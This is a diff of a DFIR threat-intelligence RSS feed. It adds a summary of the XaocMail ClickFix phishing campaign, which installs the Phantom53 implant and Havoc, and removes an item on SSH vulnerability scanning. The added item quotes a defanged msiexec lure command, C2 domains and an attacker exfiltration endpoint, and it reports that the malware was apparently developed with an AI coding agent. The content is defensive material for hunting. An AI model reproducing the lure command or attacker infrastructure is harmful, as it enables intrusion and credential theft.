@@ -5,8 +5,34 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The latest DFIR research from hundreds of sources, ranked by relevance for practitioners.</description>
     <language>en</language>
-    <lastBuildDate>Fri, 13 Nov 2026 10:02:50 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 13 Nov 2026 11:03:09 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe</title>
+      <link>https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/</link>
+      <description>A ClickFix phishing platform called XaocMail pushes an MSI that installs Phantom53, a Python-hosted implant using DNS-over-HTTPS C2 that loads Havoc in memory on demand. SOCRadar says it launched in August 2026, is still active, and the codebase shows AI-assisted development.
+
+- Delivery: XaocMail sends personalized document-sharing emails (Google Docs, Adobe Acrobat, Office365, SecuredDocs templates) linking to Cloudflare Workers pages like hxxps://securedoc.mesuttgulerr573.workers[.]dev/?id=linkId. The ClickFix page tells the victim to paste a command into Win+R. The preferred vector is msiexec /i hxxps://…/m?id=X /qn (T1218.007, T1204.004). Alternatives are a PowerShell cradle that also fetches the MSI, and an older HTA path delivering a ZIP with GUP.exe sideloading libcurl.dll. The MSIs sit in Cloudflare KV, and the phishing backend is 185.224.132[.]148 on port 8585.
+
+- Host footprint: the MSI impersonates Visual Studio Tools, Python, or Node.js and runs a CustomAction DLL. It drops a Python 3.11 runtime into a random [a-z0-9] directory under %LOCALAPPDATA% or %APPDATA%, plus two venvs. The beacon is a fake cv2.pyd (numpy, PIL, and lxml donors are also supported) launched by a random .pyw via pythonw.exe every 12 minutes. The watcher runs every 3 minutes. Task names mimic MicrosoftEdgeUpdateTask, OneDriveSyncTask, WindowsDefenderScheduledScan, OfficeBackgroundTaskHandler, and AdobeAcrobatUpdateTask plus a suffix. Elevated runs register tasks through COM ITaskFolder::RegisterTask with no schtasks.exe. Non-elevated runs write %TEMP%\p53_task_a.xml and p53_task_b.xml and use Register-ScheduledTask. State lives under HKCU\Software\Classes\CLSID.
+
+- C2: commands ride in AAAA record answers over DoH to Google, Cloudflare, and ControlD resolvers, with FQDNs of base36 tokens. Fallback is UDP/53 to hardcoded resolver IPs. The beacon gates on sandbox checks (uptime, tick delta, idle time). A week-keyed SHA256 DGA ending in .xyz handles takedowns (T1568.002). Phantom53 C2 domains in the IOCs include a8f2aac37385[.]xyz and 544504d7fe1e[.]xyz. CMD_EXEC runs base64 PowerShell with -NonInteractive -WindowStyle Hidden -EncodedCommand.
+
+- Stage two: CMD_WAKE makes the beacon write an IPC file to %TEMP% with an AES key and a Worker URL. The watcher checks the mutex Global\P53Demon_{wake_id_hex} and spawns a demon-loader pythonw.exe. That instance decrypts an AES-GCM demon.dat, reflectively loads the Havoc Demon (T1620), and zeroes the buffer. The HavoX login panel is at 145.63.138[.]67:8000, and PowerShell aliases exfiltrate to hxxp://145.63.138[.]67:8125/up/. Payloads target browser and password manager data, SSH keys and Git tokens, crypto wallets and seed phrases, messaging apps, and AI tool secrets. One alias drops Level RMM, and another does a fodhelper.exe UAC bypass.
+
+- Scope and AI: SOCRadar found almost a thousand personalized lure pages. Recipients skew toward Brazil 🇧🇷 and Peru 🇵🇪, then India 🇮🇳, Indonesia 🇮🇩, and Spain 🇪🇸, across tech, finance, education, government, logistics, and manufacturing. The codebase includes .claude/ settings, 143 numbered task files in Claude Code's naming convention, a 117 KB arch[.]md, and a prompt for a Claude agent to test the MSI in a VM.
+
+Takeaway: hunt for explorer.exe spawning msiexec.exe with a workers[.]dev URL, pythonw.exe launched by svchost.exe (Task Scheduler) running a .pyw from %APPDATA% or %LOCALAPPDATA%, and pythonw.exe loading .pyd files outside a standard Python install. Also look for pythonw.exe talking to public DoH resolver IPs on 443 or to IPs on port 53. On a hit, preserve the venv directories, task XML, and the HKCU CLSID keys before cleanup, since CMD_WIPE deletes the tasks, venvs, and temp files. Network, host, and hash IOCs are in the report.
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2121197166471623161</description>
+      <content:encoded><![CDATA[<p>A ClickFix phishing platform called XaocMail pushes an MSI that installs Phantom53, a Python-hosted implant using DNS-over-HTTPS C2 that loads Havoc in memory on demand. SOCRadar says it launched in August 2026, is still active, and the codebase shows AI-assisted development.</p><p>- Delivery: XaocMail sends personalized document-sharing emails (Google Docs, Adobe Acrobat, Office365, SecuredDocs templates) linking to Cloudflare Workers pages like hxxps://securedoc.mesuttgulerr573.workers[.]dev/?id=linkId. The ClickFix page tells the victim to paste a command into Win+R. The preferred vector is msiexec /i hxxps://…/m?id=X /qn (T1218.007, T1204.004). Alternatives are a PowerShell cradle that also fetches the MSI, and an older HTA path delivering a ZIP with GUP.exe sideloading libcurl.dll. The MSIs sit in Cloudflare KV, and the phishing backend is 185.224.132[.]148 on port 8585.</p><p>- Host footprint: the MSI impersonates Visual Studio Tools, Python, or Node.js and runs a CustomAction DLL. It drops a Python 3.11 runtime into a random [a-z0-9] directory under %LOCALAPPDATA% or %APPDATA%, plus two venvs. The beacon is a fake cv2.pyd (numpy, PIL, and lxml donors are also supported) launched by a random .pyw via pythonw.exe every 12 minutes. The watcher runs every 3 minutes. Task names mimic MicrosoftEdgeUpdateTask, OneDriveSyncTask, WindowsDefenderScheduledScan, OfficeBackgroundTaskHandler, and AdobeAcrobatUpdateTask plus a suffix. Elevated runs register tasks through COM ITaskFolder::RegisterTask with no schtasks.exe. Non-elevated runs write %TEMP%\p53_task_a.xml and p53_task_b.xml and use Register-ScheduledTask. State lives under HKCU\Software\Classes\CLSID.</p><p>- C2: commands ride in AAAA record answers over DoH to Google, Cloudflare, and ControlD resolvers, with FQDNs of base36 tokens. Fallback is UDP/53 to hardcoded resolver IPs. The beacon gates on sandbox checks (uptime, tick delta, idle time). A week-keyed SHA256 DGA ending in .xyz handles takedowns (T1568.002). Phantom53 C2 domains in the IOCs include a8f2aac37385[.]xyz and 544504d7fe1e[.]xyz. CMD_EXEC runs base64 PowerShell with -NonInteractive -WindowStyle Hidden -EncodedCommand.</p><p>- Stage two: CMD_WAKE makes the beacon write an IPC file to %TEMP% with an AES key and a Worker URL. The watcher checks the mutex Global\P53Demon_{wake_id_hex} and spawns a demon-loader pythonw.exe. That instance decrypts an AES-GCM demon.dat, reflectively loads the Havoc Demon (T1620), and zeroes the buffer. The HavoX login panel is at 145.63.138[.]67:8000, and PowerShell aliases exfiltrate to hxxp://145.63.138[.]67:8125/up/. Payloads target browser and password manager data, SSH keys and Git tokens, crypto wallets and seed phrases, messaging apps, and AI tool secrets. One alias drops Level RMM, and another does a fodhelper.exe UAC bypass.</p><p>- Scope and AI: SOCRadar found almost a thousand personalized lure pages. Recipients skew toward Brazil 🇧🇷 and Peru 🇵🇪, then India 🇮🇳, Indonesia 🇮🇩, and Spain 🇪🇸, across tech, finance, education, government, logistics, and manufacturing. The codebase includes .claude/ settings, 143 numbered task files in Claude Code&#x27;s naming convention, a 117 KB arch[.]md, and a prompt for a Claude agent to test the MSI in a VM.</p><p>Takeaway: hunt for explorer.exe spawning msiexec.exe with a workers[.]dev URL, pythonw.exe launched by svchost.exe (Task Scheduler) running a .pyw from %APPDATA% or %LOCALAPPDATA%, and pythonw.exe loading .pyd files outside a standard Python install. Also look for pythonw.exe talking to public DoH resolver IPs on 443 or to IPs on port 53. On a hit, preserve the venv directories, task XML, and the HKCU CLSID keys before cleanup, since CMD_WIPE deletes the tasks, venvs, and temp files. Network, host, and hash IOCs are in the report.</p><p>#DFIR_Radar</p><p><a href="https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/">Read the report</a> | <a href="https://x.com/DFIR_Radar/status/2121197166471623161">View on X</a></p>]]></content:encoded>
+      <dc:creator>SOCRadar</dc:creator>
+      <comments>https://x.com/DFIR_Radar/status/2121197166471623161</comments>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2121197166471623161">DFIR Radar</source>
+      <pubDate>Fri, 13 Nov 2026 11:03:09 +0000</pubDate>
+      <guid isPermaLink="false">2121197166471623161</guid>
+    </item>
     <item>
       <title>Ransomware at the hypervisor layer: how attackers use ESXi and vCenter features for malicious purposes</title>
       <link>https://securelist.com/esxi-ransomware/121959/</link>
@@ -2384,20 +2410,6 @@ Practitioner takeaway: on a host you are triaging, treat deletion or unusual mod
       <source url="https://x.com/DFIR_Radar/status/2119468403735842898">DFIR Radar</source>
       <pubDate>Sun, 08 Nov 2026 16:33:40 +0000</pubDate>
       <guid isPermaLink="false">2119468403735842898</guid>
-    </item>
-    <item>
-      <title>Scans for Sshole Vulnerability (CVE-2026-123158), (Sun, Nov 8th)</title>
-      <link>https://isc.sans.edu/diary/rss/33498</link>
-      <description>SANS honeypots detected rapid scanning growth for the "sshole" SSH vulnerability starting November 5th, with exploit attempts using oversized all-"A" passwords. Review SSH auth logs for anomalous password lengths from scanner IPs in the report.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2119460677261873640</description>
-      <content:encoded><![CDATA[<p>SANS honeypots detected rapid scanning growth for the &quot;sshole&quot; SSH vulnerability starting November 5th, with exploit attempts using oversized all-&quot;A&quot; passwords. Review SSH auth logs for anomalous password lengths from scanner IPs in the report.</p><p>#DFIR_Radar</p><p><a href="https://isc.sans.edu/diary/rss/33498">Read the report</a> | <a href="https://x.com/DFIR_Radar/status/2119460677261873640">View on X</a></p>]]></content:encoded>
-      <dc:creator>SANS ISC</dc:creator>
-      <comments>https://x.com/DFIR_Radar/status/2119460677261873640</comments>
-      <category>VULNERABILITY</category>
-      <source url="https://x.com/DFIR_Radar/status/2119460677261873640">DFIR Radar</source>
-      <pubDate>Sun, 08 Nov 2026 16:02:58 +0000</pubDate>
-      <guid isPermaLink="false">2119460677261873640</guid>
     </item>
   </channel>
 </rss>
